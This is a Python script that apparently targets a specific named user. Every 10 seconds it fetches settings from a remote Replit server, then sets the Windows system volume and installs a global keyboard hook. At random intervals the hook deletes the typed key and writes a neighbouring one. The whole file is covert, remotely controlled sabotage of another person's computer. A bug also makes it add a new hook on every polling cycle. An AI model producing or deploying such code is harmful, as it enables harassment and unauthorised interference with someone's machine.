import requests
import time
import ctypes
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import keyboard
import random

# Hardcoded username
USERNAME = "keiran"  # Replace with the actual username you want to use

# Define nearby key mappings for QWERTY layout
nearby_keys = {
    'a': ['q', 's', 'z', 'w'],
    'b': ['v', 'n', 'g', 'h'],
    'c': ['x', 'v', 'd', 'f'],
    'd': ['s', 'f', 'e', 'r'],
    'e': ['w', 'r', 's', 'd'],
    'f': ['d', 'g', 'r', 't'],
    'g': ['f', 'h', 't', 'y'],
    'h': ['g', 'j', 'y', 'u'],
    'i': ['u', 'o', 'j', 'k'],
    'j': ['h', 'k', 'u', 'i'],
    'k': ['j', 'l', 'i', 'o'],
    'l': ['k', 'p', 'o', ';'],
    'm': ['n', ',', 'h', 'j'],
    'n': ['b', 'm', 'h', 'j'],
    'o': ['i', 'p', 'k', 'l'],
    'p': ['o', ';', 'l', '['],
    'q': ['a', 'w', 's', 'e'],
    'r': ['e', 't', 'd', 'f'],
    's': ['a', 'd', 'q', 'w'],
    't': ['r', 'y', 'f', 'g'],
    'u': ['y', 'i', 'h', 'j'],
    'v': ['c', 'b', 'f', 'g'],
    'w': ['q', 'e', 'a', 's'],
    'x': ['z', 'c', 's', 'd'],
    'y': ['t', 'u', 'g', 'h'],
    'z': ['a', 'x', 's', 'd'],
    ',': ['m', '.', 'k', 'l'],
    '.': [',', '/', 'k', 'l'],
    '/': ['.', ';', 'l', "'"],
    'backspace': []
}

# Function to get the system volume control interface
def get_volume_controller():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    return volume

# Function to set the system volume
def set_volume(level):
    volume = get_volume_controller()
    volume.SetMasterVolumeLevelScalar(level / 100.0, None)

# Function to fetch user settings from the remote server
def get_user_settings(server_url, username):
    try:
        response = requests.get(f'{server_url}/get_settings', params={'username': username})
        if response.status_code == 200:
            return response.json()  # Expecting JSON data with volume and mistype settings
    except Exception as e:
        print(f"Error fetching user settings for {username}: {e}")
    return None

# Function to replace key with a nearby key
def replace_with_nearby_key(e):
    key = e.name
    if key in nearby_keys:
        replacement = random.choice(nearby_keys[key])
        print(f"Replacing {key} with {replacement}")
        keyboard.send('backspace')
        keyboard.write(replacement)

# Function to handle mistyping logic
def mistype_control(min_chars, max_chars):
    mistype_count = 0
    threshold = random.randint(min_chars, max_chars)  # Set the random threshold at the start

    def on_key_press(event):
        nonlocal mistype_count, threshold

        # Increment the counter with each key press
        mistype_count += 1

        # Trigger mistype replacement only when the count reaches the threshold
        if mistype_count >= threshold:
            replace_with_nearby_key(event)
            mistype_count = 0  # Reset the counter after replacing the key
            threshold = random.randint(min_chars, max_chars)  # Set a new random threshold

    # Hook the on_press event to start listening for key presses
    keyboard.on_press(on_key_press)

# Main function to run both the volume control and mistyping
def main(server_url):
    while True:
        # Fetch user settings
        settings = get_user_settings(server_url, USERNAME)
        
        if settings:
            # Set volume
            set_volume(settings['volume'])
            
            # Control mistyping based on fetched settings
            mistype_control(settings['min_chars'], settings['max_chars'])
        else:
            print("Failed to fetch settings. Retrying...")

        time.sleep(10)  # Check for updates every 10 seconds

if __name__ == "__main__":
    server_url = "https://6e56896c-b98e-4fa3-aad3-fd2d246e23c8-00-33lf61r7kb7g9.riker.replit.dev/"  # Replace with your server URL
    main(server_url)
